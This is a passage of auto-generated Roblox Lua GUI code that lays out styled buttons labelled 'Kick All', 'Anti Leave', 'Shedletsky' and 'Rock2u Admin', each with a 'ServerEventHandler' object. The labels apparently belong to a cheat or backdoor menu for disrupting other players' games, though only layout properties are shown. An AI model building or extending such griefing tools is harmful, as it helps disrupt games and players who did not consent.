--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.LocalScript
G2L["145"].Name = [[LocalScript]]
G2L["145"].Parent = G2L["134"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All
G2L["146"].Name = [[Kick All]]
G2L["146"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["146"].Text = [[Kick All]]
G2L["146"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["146"].TextScaled = true
G2L["146"].TextSize = 14
G2L["146"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["146"].TextStrokeTransparency = 1
G2L["146"].TextWrapped = true
G2L["146"].TextXAlignment = Enum.TextXAlignment.Center
G2L["146"].TextYAlignment = Enum.TextYAlignment.Center
G2L["146"].Active = true
G2L["146"].AnchorPoint = Vector2.new(0, 0)
G2L["146"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["146"].BackgroundTransparency = 0.5
G2L["146"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["146"].BorderSizePixel = 0
G2L["146"].ClipsDescendants = false
G2L["146"].Draggable = false
G2L["146"].Position = UDim2.new(0, 0, 0, 0)
G2L["146"].Rotation = 0
G2L["146"].Selectable = true
G2L["146"].SelectionOrder = 0
G2L["146"].Size = UDim2.new(0, 200, 0, 50)
G2L["146"].Visible = true
G2L["146"].ZIndex = 1
G2L["146"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.UICorner
G2L["147"].Name = [[UICorner]]
G2L["147"].CornerRadius = UDim.new(0, 10)
G2L["147"].Parent = G2L["146"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.RippleClick
G2L["148"].Name = [[RippleClick]]
G2L["148"].Parent = G2L["146"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.RippleClick.Circle
G2L["149"].Name = [[Circle]]
G2L["149"].Image = [[rbxassetid://266543268]]
G2L["149"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["149"].ScaleType = Enum.ScaleType.Stretch
G2L["149"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["149"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["149"].Active = false
G2L["149"].AnchorPoint = Vector2.new(0, 0)
G2L["149"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["149"].BackgroundTransparency = 1
G2L["149"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["149"].BorderSizePixel = 1
G2L["149"].ClipsDescendants = false
G2L["149"].Draggable = false
G2L["149"].Position = UDim2.new(0, 0, 0, 0)
G2L["149"].Rotation = 0
G2L["149"].Selectable = false
G2L["149"].SelectionOrder = 0
G2L["149"].Size = UDim2.new(0, 0, 0, 0)
G2L["149"].Visible = true
G2L["149"].ZIndex = 10
G2L["149"].Parent = G2L["148"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder
G2L["150"].Name = [[shadowHolder]]
G2L["150"].Active = false
G2L["150"].AnchorPoint = Vector2.new(0, 0)
G2L["150"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["150"].BackgroundTransparency = 1
G2L["150"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["150"].BorderSizePixel = 1
G2L["150"].ClipsDescendants = false
G2L["150"].Draggable = false
G2L["150"].Position = UDim2.new(0, 0, 0, 0)
G2L["150"].Rotation = 0
G2L["150"].Selectable = false
G2L["150"].SelectionOrder = 0
G2L["150"].Size = UDim2.new(1, 0, 1, 0)
G2L["150"].Visible = true
G2L["150"].ZIndex = -1
G2L["150"].Parent = G2L["146"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder.umbraShadow
G2L["151"].Name = [[umbraShadow]]
G2L["151"].Image = [[rbxassetid://1316045217]]
G2L["151"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["151"].ScaleType = Enum.ScaleType.Slice
G2L["151"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["151"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["151"].Active = false
G2L["151"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["151"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["151"].BackgroundTransparency = 1
G2L["151"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["151"].BorderSizePixel = 1
G2L["151"].ClipsDescendants = false
G2L["151"].Draggable = false
G2L["151"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["151"].Rotation = 0
G2L["151"].Selectable = false
G2L["151"].SelectionOrder = 0
G2L["151"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["151"].Visible = true
G2L["151"].ZIndex = 1
G2L["151"].Parent = G2L["150"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder.penumbraShadow
G2L["152"].Name = [[penumbraShadow]]
G2L["152"].Image = [[rbxassetid://1316045217]]
G2L["152"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["152"].ScaleType = Enum.ScaleType.Slice
G2L["152"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["152"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["152"].Active = false
G2L["152"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["152"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["152"].BackgroundTransparency = 1
G2L["152"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["152"].BorderSizePixel = 1
G2L["152"].ClipsDescendants = false
G2L["152"].Draggable = false
G2L["152"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["152"].Rotation = 0
G2L["152"].Selectable = false
G2L["152"].SelectionOrder = 0
G2L["152"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["152"].Visible = true
G2L["152"].ZIndex = 1
G2L["152"].Parent = G2L["150"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.shadowHolder.ambientShadow
G2L["153"].Name = [[ambientShadow]]
G2L["153"].Image = [[rbxassetid://1316045217]]
G2L["153"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["153"].ScaleType = Enum.ScaleType.Slice
G2L["153"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["153"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["153"].Active = false
G2L["153"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["153"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["153"].BackgroundTransparency = 1
G2L["153"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["153"].BorderSizePixel = 1
G2L["153"].ClipsDescendants = false
G2L["153"].Draggable = false
G2L["153"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["153"].Rotation = 0
G2L["153"].Selectable = false
G2L["153"].SelectionOrder = 0
G2L["153"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["153"].Visible = true
G2L["153"].ZIndex = 1
G2L["153"].Parent = G2L["150"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.TextButton_Roundify_12px
G2L["154"].Name = [[TextButton_Roundify_12px]]
G2L["154"].Image = [[rbxassetid://3570695787]]
G2L["154"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["154"].ScaleType = Enum.ScaleType.Slice
G2L["154"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["154"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["154"].Active = true
G2L["154"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["154"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["154"].BackgroundTransparency = 1
G2L["154"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["154"].BorderSizePixel = 1
G2L["154"].ClipsDescendants = false
G2L["154"].Draggable = false
G2L["154"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["154"].Rotation = 0
G2L["154"].Selectable = true
G2L["154"].SelectionOrder = 0
G2L["154"].Size = UDim2.new(1, 0, 1, 0)
G2L["154"].Visible = true
G2L["154"].ZIndex = 1
G2L["154"].Parent = G2L["146"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Kick All.ServerEventHandler
G2L["155"].Name = [[ServerEventHandler]]
G2L["155"].Parent = G2L["146"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave
G2L["156"].Name = [[Anti Leave]]
G2L["156"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["156"].Text = [[Anti Leave]]
G2L["156"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["156"].TextScaled = true
G2L["156"].TextSize = 14
G2L["156"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["156"].TextStrokeTransparency = 1
G2L["156"].TextWrapped = true
G2L["156"].TextXAlignment = Enum.TextXAlignment.Center
G2L["156"].TextYAlignment = Enum.TextYAlignment.Center
G2L["156"].Active = true
G2L["156"].AnchorPoint = Vector2.new(0, 0)
G2L["156"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["156"].BackgroundTransparency = 0.5
G2L["156"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["156"].BorderSizePixel = 0
G2L["156"].ClipsDescendants = false
G2L["156"].Draggable = false
G2L["156"].Position = UDim2.new(0, 0, 0, 0)
G2L["156"].Rotation = 0
G2L["156"].Selectable = true
G2L["156"].SelectionOrder = 0
G2L["156"].Size = UDim2.new(0, 200, 0, 50)
G2L["156"].Visible = true
G2L["156"].ZIndex = 1
G2L["156"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.UICorner
G2L["157"].Name = [[UICorner]]
G2L["157"].CornerRadius = UDim.new(0, 10)
G2L["157"].Parent = G2L["156"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.RippleClick
G2L["158"].Name = [[RippleClick]]
G2L["158"].Parent = G2L["156"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.RippleClick.Circle
G2L["159"].Name = [[Circle]]
G2L["159"].Image = [[rbxassetid://266543268]]
G2L["159"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["159"].ScaleType = Enum.ScaleType.Stretch
G2L["159"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["159"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["159"].Active = false
G2L["159"].AnchorPoint = Vector2.new(0, 0)
G2L["159"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["159"].BackgroundTransparency = 1
G2L["159"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["159"].BorderSizePixel = 1
G2L["159"].ClipsDescendants = false
G2L["159"].Draggable = false
G2L["159"].Position = UDim2.new(0, 0, 0, 0)
G2L["159"].Rotation = 0
G2L["159"].Selectable = false
G2L["159"].SelectionOrder = 0
G2L["159"].Size = UDim2.new(0, 0, 0, 0)
G2L["159"].Visible = true
G2L["159"].ZIndex = 10
G2L["159"].Parent = G2L["158"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder
G2L["160"].Name = [[shadowHolder]]
G2L["160"].Active = false
G2L["160"].AnchorPoint = Vector2.new(0, 0)
G2L["160"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["160"].BackgroundTransparency = 1
G2L["160"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["160"].BorderSizePixel = 1
G2L["160"].ClipsDescendants = false
G2L["160"].Draggable = false
G2L["160"].Position = UDim2.new(0, 0, 0, 0)
G2L["160"].Rotation = 0
G2L["160"].Selectable = false
G2L["160"].SelectionOrder = 0
G2L["160"].Size = UDim2.new(1, 0, 1, 0)
G2L["160"].Visible = true
G2L["160"].ZIndex = -1
G2L["160"].Parent = G2L["156"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder.umbraShadow
G2L["161"].Name = [[umbraShadow]]
G2L["161"].Image = [[rbxassetid://1316045217]]
G2L["161"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["161"].ScaleType = Enum.ScaleType.Slice
G2L["161"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["161"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["161"].Active = false
G2L["161"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["161"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["161"].BackgroundTransparency = 1
G2L["161"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["161"].BorderSizePixel = 1
G2L["161"].ClipsDescendants = false
G2L["161"].Draggable = false
G2L["161"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["161"].Rotation = 0
G2L["161"].Selectable = false
G2L["161"].SelectionOrder = 0
G2L["161"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["161"].Visible = true
G2L["161"].ZIndex = 1
G2L["161"].Parent = G2L["160"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder.penumbraShadow
G2L["162"].Name = [[penumbraShadow]]
G2L["162"].Image = [[rbxassetid://1316045217]]
G2L["162"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["162"].ScaleType = Enum.ScaleType.Slice
G2L["162"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["162"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["162"].Active = false
G2L["162"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["162"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["162"].BackgroundTransparency = 1
G2L["162"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["162"].BorderSizePixel = 1
G2L["162"].ClipsDescendants = false
G2L["162"].Draggable = false
G2L["162"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["162"].Rotation = 0
G2L["162"].Selectable = false
G2L["162"].SelectionOrder = 0
G2L["162"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["162"].Visible = true
G2L["162"].ZIndex = 1
G2L["162"].Parent = G2L["160"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.shadowHolder.ambientShadow
G2L["163"].Name = [[ambientShadow]]
G2L["163"].Image = [[rbxassetid://1316045217]]
G2L["163"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["163"].ScaleType = Enum.ScaleType.Slice
G2L["163"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["163"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["163"].Active = false
G2L["163"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["163"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["163"].BackgroundTransparency = 1
G2L["163"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["163"].BorderSizePixel = 1
G2L["163"].ClipsDescendants = false
G2L["163"].Draggable = false
G2L["163"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["163"].Rotation = 0
G2L["163"].Selectable = false
G2L["163"].SelectionOrder = 0
G2L["163"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["163"].Visible = true
G2L["163"].ZIndex = 1
G2L["163"].Parent = G2L["160"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.TextButton_Roundify_12px
G2L["164"].Name = [[TextButton_Roundify_12px]]
G2L["164"].Image = [[rbxassetid://3570695787]]
G2L["164"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["164"].ScaleType = Enum.ScaleType.Slice
G2L["164"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["164"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["164"].Active = true
G2L["164"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["164"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["164"].BackgroundTransparency = 1
G2L["164"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["164"].BorderSizePixel = 1
G2L["164"].ClipsDescendants = false
G2L["164"].Draggable = false
G2L["164"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["164"].Rotation = 0
G2L["164"].Selectable = true
G2L["164"].SelectionOrder = 0
G2L["164"].Size = UDim2.new(1, 0, 1, 0)
G2L["164"].Visible = true
G2L["164"].ZIndex = 1
G2L["164"].Parent = G2L["156"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Anti Leave.ServerEventHandler
G2L["165"].Name = [[ServerEventHandler]]
G2L["165"].Parent = G2L["156"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.UIGridLayout
G2L["166"].Name = [[UIGridLayout]]
G2L["166"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky
G2L["167"].Name = [[Shedletsky]]
G2L["167"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["167"].Text = [[Shedletsky]]
G2L["167"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["167"].TextScaled = true
G2L["167"].TextSize = 14
G2L["167"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["167"].TextStrokeTransparency = 1
G2L["167"].TextWrapped = true
G2L["167"].TextXAlignment = Enum.TextXAlignment.Center
G2L["167"].TextYAlignment = Enum.TextYAlignment.Center
G2L["167"].Active = true
G2L["167"].AnchorPoint = Vector2.new(0, 0)
G2L["167"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["167"].BackgroundTransparency = 0.5
G2L["167"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["167"].BorderSizePixel = 0
G2L["167"].ClipsDescendants = false
G2L["167"].Draggable = false
G2L["167"].Position = UDim2.new(0, 0, 0, 0)
G2L["167"].Rotation = 0
G2L["167"].Selectable = true
G2L["167"].SelectionOrder = 0
G2L["167"].Size = UDim2.new(0, 200, 0, 50)
G2L["167"].Visible = true
G2L["167"].ZIndex = 1
G2L["167"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.UICorner
G2L["168"].Name = [[UICorner]]
G2L["168"].CornerRadius = UDim.new(0, 8)
G2L["168"].Parent = G2L["167"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder
G2L["169"].Name = [[shadowHolder]]
G2L["169"].Active = false
G2L["169"].AnchorPoint = Vector2.new(0, 0)
G2L["169"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["169"].BackgroundTransparency = 1
G2L["169"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["169"].BorderSizePixel = 1
G2L["169"].ClipsDescendants = false
G2L["169"].Draggable = false
G2L["169"].Position = UDim2.new(0, 0, 0, 0)
G2L["169"].Rotation = 0
G2L["169"].Selectable = false
G2L["169"].SelectionOrder = 0
G2L["169"].Size = UDim2.new(1, 0, 1, 0)
G2L["169"].Visible = true
G2L["169"].ZIndex = -1
G2L["169"].Parent = G2L["167"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder.umbraShadow
G2L["170"].Name = [[umbraShadow]]
G2L["170"].Image = [[rbxassetid://1316045217]]
G2L["170"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["170"].ScaleType = Enum.ScaleType.Slice
G2L["170"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["170"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["170"].Active = false
G2L["170"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["170"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["170"].BackgroundTransparency = 1
G2L["170"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["170"].BorderSizePixel = 1
G2L["170"].ClipsDescendants = false
G2L["170"].Draggable = false
G2L["170"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["170"].Rotation = 0
G2L["170"].Selectable = false
G2L["170"].SelectionOrder = 0
G2L["170"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["170"].Visible = true
G2L["170"].ZIndex = 1
G2L["170"].Parent = G2L["169"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder.penumbraShadow
G2L["171"].Name = [[penumbraShadow]]
G2L["171"].Image = [[rbxassetid://1316045217]]
G2L["171"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["171"].ScaleType = Enum.ScaleType.Slice
G2L["171"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["171"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["171"].Active = false
G2L["171"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["171"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["171"].BackgroundTransparency = 1
G2L["171"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["171"].BorderSizePixel = 1
G2L["171"].ClipsDescendants = false
G2L["171"].Draggable = false
G2L["171"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["171"].Rotation = 0
G2L["171"].Selectable = false
G2L["171"].SelectionOrder = 0
G2L["171"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["171"].Visible = true
G2L["171"].ZIndex = 1
G2L["171"].Parent = G2L["169"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.shadowHolder.ambientShadow
G2L["172"].Name = [[ambientShadow]]
G2L["172"].Image = [[rbxassetid://1316045217]]
G2L["172"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["172"].ScaleType = Enum.ScaleType.Slice
G2L["172"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["172"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["172"].Active = false
G2L["172"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["172"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["172"].BackgroundTransparency = 1
G2L["172"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["172"].BorderSizePixel = 1
G2L["172"].ClipsDescendants = false
G2L["172"].Draggable = false
G2L["172"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["172"].Rotation = 0
G2L["172"].Selectable = false
G2L["172"].SelectionOrder = 0
G2L["172"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["172"].Visible = true
G2L["172"].ZIndex = 1
G2L["172"].Parent = G2L["169"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.TextButton_Roundify_12px
G2L["173"].Name = [[TextButton_Roundify_12px]]
G2L["173"].Image = [[rbxassetid://3570695787]]
G2L["173"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["173"].ScaleType = Enum.ScaleType.Slice
G2L["173"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["173"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["173"].Active = true
G2L["173"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["173"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["173"].BackgroundTransparency = 1
G2L["173"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["173"].BorderSizePixel = 1
G2L["173"].ClipsDescendants = false
G2L["173"].Draggable = false
G2L["173"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["173"].Rotation = 0
G2L["173"].Selectable = true
G2L["173"].SelectionOrder = 0
G2L["173"].Size = UDim2.new(1, 0, 1, 0)
G2L["173"].Visible = true
G2L["173"].ZIndex = 1
G2L["173"].Parent = G2L["167"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Shedletsky.ServerEventHandler
G2L["174"].Name = [[ServerEventHandler]]
G2L["174"].Parent = G2L["167"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin
G2L["175"].Name = [[Rock2u Admin]]
G2L["175"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["175"].Text = [[Rock2u Admin]]
G2L["175"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["175"].TextScaled = true
G2L["175"].TextSize = 14
G2L["175"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["175"].TextStrokeTransparency = 1
G2L["175"].TextWrapped = true
G2L["175"].TextXAlignment = Enum.TextXAlignment.Center
G2L["175"].TextYAlignment = Enum.TextYAlignment.Center
G2L["175"].Active = true
G2L["175"].AnchorPoint = Vector2.new(0, 0)
G2L["175"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["175"].BackgroundTransparency = 0.5
G2L["175"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["175"].BorderSizePixel = 0
G2L["175"].ClipsDescendants = false
G2L["175"].Draggable = false
G2L["175"].Position = UDim2.new(0, 0, 0, 0)
G2L["175"].Rotation = 0
G2L["175"].Selectable = true
G2L["175"].SelectionOrder = 0
G2L["175"].Size = UDim2.new(0, 200, 0, 50)
G2L["175"].Visible = true
G2L["175"].ZIndex = 1
G2L["175"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.UICorner
G2L["176"].Name = [[UICorner]]
G2L["176"].CornerRadius = UDim.new(0, 10)
G2L["176"].Parent = G2L["175"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.RippleClick
G2L["177"].Name = [[RippleClick]]
G2L["177"].Parent = G2L["175"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.RippleClick.Circle
G2L["178"].Name = [[Circle]]
G2L["178"].Image = [[rbxassetid://266543268]]
G2L["178"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["178"].ScaleType = Enum.ScaleType.Stretch
G2L["178"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["178"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["178"].Active = false
G2L["178"].AnchorPoint = Vector2.new(0, 0)
G2L["178"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["178"].BackgroundTransparency = 1
G2L["178"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["178"].BorderSizePixel = 1
G2L["178"].ClipsDescendants = false
G2L["178"].Draggable = false
G2L["178"].Position = UDim2.new(0, 0, 0, 0)
G2L["178"].Rotation = 0
G2L["178"].Selectable = false
G2L["178"].SelectionOrder = 0
G2L["178"].Size = UDim2.new(0, 0, 0, 0)
G2L["178"].Visible = true
G2L["178"].ZIndex = 10
G2L["178"].Parent = G2L["177"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder
G2L["179"].Name = [[shadowHolder]]
G2L["179"].Active = false
G2L["179"].AnchorPoint = Vector2.new(0, 0)
G2L["179"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["179"].BackgroundTransparency = 1
G2L["179"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["179"].BorderSizePixel = 1
G2L["179"].ClipsDescendants = false
G2L["179"].Draggable = false
G2L["179"].Position = UDim2.new(0, 0, 0, 0)
G2L["179"].Rotation = 0
G2L["179"].Selectable = false
G2L["179"].SelectionOrder = 0
G2L["179"].Size = UDim2.new(1, 0, 1, 0)
G2L["179"].Visible = true
G2L["179"].ZIndex = -1
G2L["179"].Parent = G2L["175"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder.umbraShadow
G2L["180"].Name = [[umbraShadow]]
G2L["180"].Image = [[rbxassetid://1316045217]]
G2L["180"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["180"].ScaleType = Enum.ScaleType.Slice
G2L["180"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["180"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["180"].Active = false
G2L["180"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["180"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["180"].BackgroundTransparency = 1
G2L["180"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["180"].BorderSizePixel = 1
G2L["180"].ClipsDescendants = false
G2L["180"].Draggable = false
G2L["180"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["180"].Rotation = 0
G2L["180"].Selectable = false
G2L["180"].SelectionOrder = 0
G2L["180"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["180"].Visible = true
G2L["180"].ZIndex = 1
G2L["180"].Parent = G2L["179"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder.penumbraShadow
G2L["181"].Name = [[penumbraShadow]]
G2L["181"].Image = [[rbxassetid://1316045217]]
G2L["181"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["181"].ScaleType = Enum.ScaleType.Slice
G2L["181"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["181"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["181"].Active = false
